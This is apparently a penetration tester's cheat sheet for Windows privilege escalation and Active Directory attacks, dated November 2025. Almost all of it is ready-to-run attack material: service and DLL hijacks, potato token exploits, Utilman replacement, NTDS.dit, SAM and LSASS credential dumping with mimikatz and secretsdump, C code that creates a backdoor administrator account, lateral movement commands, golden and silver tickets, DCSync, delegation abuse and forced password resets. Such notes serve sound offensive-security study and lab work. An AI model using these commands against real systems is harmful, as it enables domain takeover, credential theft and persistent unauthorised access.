Last update: 2025.11.14
# Windows
### Group Abuses:
- Ref: https://www.thehacker.recipes/ad/movement/builtins/security-groups
#### Server Operators:
- Ref: https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
- WinRM List services: `services`
- Payload:
```
sc.exe config <service> binPath="C:\users\public\downloads\shell.exe"
sc.exe stop <service>
sc.exe start <service>
```
#### Backup Operators:
- grants `SeBackupPrivilege` and `SeRestorePrivilege`. See Token Abuses.
#### DNS Admins:
1. `msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll`
2. `dnscmd.exe /config /serverlevelplugindll </full/path/to/adduser.dll>`
3. `sc stop dns`; `sc start dns` (or restart machine)
#### Print Operators:
1. Grants `SeLoadDriverPrivilege`
2. Need UAC bypass if token not present (https://github.com/hfiref0x/UACME)
3. See Token Abuses.

---
### Token Abuses:
Ref: https://github.com/gtworek/Priv2Admin
#### Enable All Privileges:
- GitHub: https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/refs/heads/master/EnableAllTokenPrivs.ps1
- Command: `.\EnableAllTokenPrivs.ps1` (In PowerShell session)

#### `SeImpersonatePrivilege`:
###### GodPotato:
- GitHub: https://github.com/BeichenDream/GodPotato (Precompiled, in resources folder)
- Command: `.\godpotato.exe -cmd "[cmd /c] <command>"`
###### JuicyPotato:
- GitHub: https://github.com/ohpe/juicy-potato (Precompiled)
- Compatibility: Before Server 2019 & Win 10 build 1809
- Command: `.\juicypotato.exe -l 53375 -p cmd.exe -a "/c <cmd>" -t *` (may need full path)
###### PrintSpoofer:
- Ref: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
- Compatibility: Server 2019; Win 10
- GitHub: https://github.com/itm4n/PrintSpoofer (Precompiled)
- Command: `.\PrintSpoofer.exe -c <cmd>` (may need full path)

#### `SeManageVolumePrivilege`:
###### Enable Write Access:
- Raw: https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c
- Pre-compiled: https://github.com/CsEnox/SeManageVolumeExploit
###### Trigger 1: PrintNotify
1. Generate DLL revshell named `Printconfig.dll`
2. Copy DLL to `C:\Windows\System32\spool\drivers\x64\3\`, overwrite existing one
3. Run trigger in PowerShell session.
```
PS> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")

PS> $object = [Activator]::CreateInstance($type)
```
###### Trigger 2: WerTrigger
- Ref: https://github.com/sailay1996/WerTrigger
- NOTE: `WerTrigger.exe` generates no output. Run commands in empty shell.
###### Other Triggers:
- Scheduled tasks

#### `SeRestorePrivilege`:
###### Enable Restore Privileges:
- https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1
###### Replace Files:
1. `ren C:\Windows\System32\Utilman.exe c:\Windows\System32\Utilman.old`
2. `ren C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe`
###### Start RDP Session:
- `rdesktop <target>`
- `xfreerdp3 /dynamic-resolution /u:anything /p:anything /v:<target> /sec:tls`
###### Trigger Shell:
- `WIN` + `U`. Command prompt should show up.

#### `SeBackupPrivilege`:
Ref: https://github.com/giuliano108/SeBackupPrivilege
###### Import modules and set up:
1. `Import-Module .\SeBackupPrivilegeUtils.dll`
2. `Import-Module .\SeBackupPrivilegeCmdLets.dll`
3. `Set-SeBackupPrivilege`
###### File Copy:
1. `Copy-FileSeBackupPrivilege <source> <destination>`
###### NTDS.DIT:
1. `diskshadow.exe /s exploit.dsh`
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```
2. `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit <destination>`
3. `reg save HKLM\SYSTEM system.bak`; `reg save HKLM\SAM sam.bak`
4. `impacket-secretsdump.py`; `DSInternals`

#### `SeAssignPrimaryTokenPrivilege`:
TODO

#### `SeLoadDriverPrivilege`:
###### Enable Privilege
1. CPP: https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp
2. Add headers: `#include <stdio.h>`; `#include "tchar.h"`
3. Compile: `cl.exe /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`
4. `.\ExploitCapcom.exe` (https://github.com/tandasat/ExploitCapcom)
###### Exploitation with GUI:
1. Download `Capcom.sys` driver (https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
	1. `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\path\to\Capcom.sys`
	2. `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`
2. `.\ExploitCapcom.exe` (https://github.com/tandasat/ExploitCapcom)
###### Exploitation without GUI:
- Edit `ExploitCapcom.cpp`. Change `cmd.exe` to `shell.exe`.
###### Automated:
- `.\EopLoadDriver.exe System\CurrentControlSet\Capcom c:\path\to\capcom.sys`
- `ExploitCapcom.exe`

#### `SeDebugPrivilege`:
###### Process Dump:
1. Dump process: `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
2. Mimikatz: `mimikatz.exe`; `sekurlsa::minidump lsass.dmp`; `sekurlsa::logonpasswords`
###### PsGetSystem:
- Ref: https://github.com/decoder-it/psgetsystem
1. `powershell -ep bypass`; `. .\psgetsys.ps1`
2. Get PIDs: `tasklist` (targets: `lsass.exe`; `winlogon.exe)
3. `ImpersonateFromParentPid -ppid <parentpid> -command <cmd> -cmdargs <args>`
###### PrivFu:
- Ref: https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
- Ref: https://ch3ng625.github.io/pov

#### `SeTakeOwnershipPrivilege`:
###### Access files:
- Take ownership: `takeown /f <filepath>`
- Grant full privileges: `icacls <filepath> /grant <user/group>:F`
###### Files of interest:
- `c:\inetpub\wwwroot\web.config`
- `%WINDIR%\repair\sam`
- `%WINDIR%\repair\software`; `%WINDIR%\repair\security`
- `%WINDIR%\system32\config\default.sav`
- `%WINDIR%\system32\config\security.sav`
- `%WINDIR%\system32\config\software.sav`
- `%WINDIR%\system32\config\system.sav`
- `*.kdbx`; `passwords.*`; etc.

---
### UAC Bypass:
Ref: https://github.com/hfiref0x/UACME
TODO

---
### Exploitable Applications:
#### PuTTY:
- Plaintext credentials: `reg query hkcu\software\simontatham\putty\sessions /t reg_sz /s`

---
### SharpGPOAbuse.exe:
- Add GPO: `.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author <domain>\<user> --Command "cmd.exe" --Arguments "/c C:\windows\temp\shell.exe" --GPOName "<gpo_name>"`
- Force refresh: `gpupdate`

---
### Custom EXE / DLL:
###### EXE:
Compile: `x86_64-w64-mingw32-gcc <EXE>.c -o <EXE>.exe`
```c
#include <stdlib.h>
int main()
{
	int i;
	
	i = system("net user ch3ng password123! /add");
	i = system("net localgroup administrators ch3ng /add");
	
	return 0;
}
```
###### DLL:
Compile: `x86_64-w64-mingw32-gcc <DLL>.cpp --shared -o <DLL>.dll`
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			int i;
			i = system("net user ch3ng password123! /add");
			i = system("net localgroup administrators ch3ng /add");
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}
```

---
# Active Directory
### Lateral Movement Techniques:
#### WMI & WinRM
**CMD:**
- `wmic /node:<target> /user:<user> /password:<pass> process call create <program>`
- `winrs -r:<target_host> -u:<user> -p:<pass> "cmd /c <command>"`
**PowerShell:**
```powershell
$username = '<user>';
$password = '<pass>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <target> -Credential $credential -SessionOption $Options
$command = '<command>';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
```powershell
$username = '<user>';
$password = '<pass>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName <target_IP> -Credential  $credential

# Then, Enter-PSSession 1
```

#### PsExec
- **CMD:** `.\psexec.exe -i \\<host> -u <domain>\<user> -p <pass> cmd`

#### Overpass the Hash
- **Mimikatz:** `sekurlsa::pth /user:<user> /domain:<domain.tld> /ntlm:<hash> /run:powershell`

#### DCOM
**PowerShell:**
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c <cmd>","7")
```

---
### DCSync / NTDS.DIT Read:
###### Impacket:
- `impacket-secretsdump '<domain.tld>'/'<user>':'<password>'@'<IP>'`
###### NTDS.DIT
- `impacket-secretsdump -ntds ntds.dit -system <sys_registry> local`
###### Mimikatz
- `lsadump::dcsync [/user:<domain>\<target>]`
###### Shadow Copy:
1. `vshadow.exe -nw -p C:` (find shadow copy device name)
2. `copy <shadow_copy_device_name>\windows\ntds\ntds.dit c:\ntds.dit.bak`
3. `reg.exe save hklm\system c:\system.bak`

---
### Silver Ticket:
###### Requirements:
- SPN (service account) password hash
- Domain SID (RID not needed)
- Target SPN (i.e. target service)
	- `http/host.domain.tld[:port]`
###### Exploitation:
- **Mimikatz:** `kerberos::golden /sid:<domain-SID> /domain:<domain.tld> /ptt /target:<host.domain.tld> /service:<service> /rc4:<SPN_hash> /user:<target_user>`
	- `target_user` usually privileged account (e.g., admin)

---
### Golden Ticket:
###### Requirements:
- `krbtgt`'s NTLM
- Domain SID
###### Exploitation:
- **Mimikatz:** `kerberos::golden /user:<target_user> /domain:<domain.tld> /sid:<domain_SID> /krbtgt:<krb_hash> /ptt`

---
### DACL Abuses:
#### Shadow Credentials:
###### References:
- https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/
###### Conditions:
- `GenericAll`/`GenericWrite` on object
###### Exploitation:
- `certipy-ad [-debug] shadow auto -u <user@domain.tld> -p <pass> -account <target> -dc-ip <IP>`
- `bloodyAD --host <host> -d <domain.tld> -u <user> -p <pass> add shadowCredentials <target>`

#### Resource Based Constrained Delegation:
###### References:
- https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/
###### Condition:
- `GenericAll` on `DC$`
###### Exploitation:
Step 1: create fake computer account
- `impacket-addcomputer <domain.tld>/<user>[:<pass>] [-hashes <LM:NT>] -computer-name ch3ng -computer-pass <newpass> -dc-ip <IP>`
- `bloodyAD -u <user> -p <pass> -d <domain.tld> --host <IP> add computer ch3ng <newpass>`
Step 2: Rewrite `AllowedToActOnBehalfOfOtherIdentity` property
- `impacket-rbcd <domain.tld>/<user>[:<pass>] [-hashes <LM:NT>] -action write -delegate-to <DC_HOST$> -delegate-from 'ch3ng$' -dc-ip <IP>`
- `bloodyAD --host <IP> -u <user> -p <pass> -d <domain.tld> add rbcd <DC_HOST$> 'ch3ng$'`
Step 3: Generate CIFS service ticket
- `impacket-getST '<domain.tld>/ch3ng$:<newpass>' -spn cifs/<host.domain.tld> -impersonate administrator -dc-ip <IP>`
Step 4: Get shell
- `impacket-psexec <domain.tld>/administrator@<host.domain.tld> -k -no-pass -dc-ip <IP>`

#### Read gMSA Password:
###### References:

###### Conditions:
- `ReadGMSAPassword` edge.
###### Exploitation:
- `bloodyAD --host <host> -d <domain.tld> -u <user> -p <pass> get object <target> --attr msDS-ManagedPassword`

#### Read LAPS Password:
###### References:
- https://www.hackingarticles.in/credential-dumping-laps/
- https://ch3ng625.github.io/timelapse
###### Conditions:
- Have edge `ReadLAPSPassword`
###### Exploitation:
- `impacket-GetLAPSPassword <domain.tld>/<user>:<pass> -dc-ip <IP>`
- `netexec ldap <IP> -d <domain.tld> -u <user> -p <pass> --module laps`
- `bloodyAD --host <IP> -d <domain.tld> -u <user> -p <pass> get search --filter '(ms-mcs-admpwdexpirationtime=*) --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime`

#### Targeted Kerberoasting:
###### References:
- https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py
###### Conditions:
- `GenericWrite` on a user
###### Exploitation:
- `python targetedKerberoast.py --dc-ip <IP> -v -d '<domain.tld>' -u '<user>' -p '<pass>' --request-user '<target>'`

#### Targeted AS-REP Roasting:
###### Conditions:
- `GenericWrite` or `GenericAll` on a user
###### Exploitation:
- Re-enable `PreauthNotRequired` for target

#### Force Change Password:
###### References:
- https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/
###### Exploitation:
- `net rpc password <target> <newpass> -U '<domain.tld>/<user>%<pass>' -S <IP>`
- `pth-net rpc password <target> <newpass> -U '<domain.tld>/<user>%<LM:NT>' -S <IP>`
- `rpcclient -U <domain.tld>/<user> <IP>`; `setuserinfo <target> 23 <newpass>`
- `bloodyAD --host <host> -d <domain.tld> -u <user> -p <pass> set password <target> <newpass>`
- `impacket-changepasswd '<domain.tld>/<target>'@<IP> -newpass <newpass> -altuser <domain.tld>/<user> -altpass <pass> -reset`

#### Add User to Group:
###### References:

###### Conditions:
- `AddSelf` on group
###### Exploitation:
- `bloodyAD --host <host> -d <domain.tld> -u <user> -p <pass> add groupMember <group> <target_user>`

#### Descendent Object Takeover:
###### References:
- https://bloodhound.specterops.io/resources/edges/generic-all#with-genericall-over-an-ou
###### Conditions:
- `GenericAll` on OU containing the targeted object.
###### Exploitation:
- `bloodyAD -d <domain.tld> -u <user> -p <pass> --host <host> add genericAll '<target_OU>' '<target_user>'`
- `impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal '<target_user>' -target-dn '<target_OU>' [-k] [-use-ldaps] '<domain.tld>/<user>:<pass>'`

---